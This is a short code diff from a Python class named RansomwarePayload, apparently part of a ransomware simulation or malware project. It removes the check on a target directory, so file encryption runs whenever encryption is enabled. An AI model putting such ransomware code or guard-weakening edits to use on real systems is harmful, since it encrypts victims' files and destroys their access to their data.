@@ -61,7 +61,7 @@ class RansomwarePayload:
 
         LOG.info("Running ransomware payload")
 
-        if self._encryption_enabled and self._target_dir:
+        if self._encryption_enabled:
             file_list = self._find_files()
             self._encrypt_files(file_list)
 
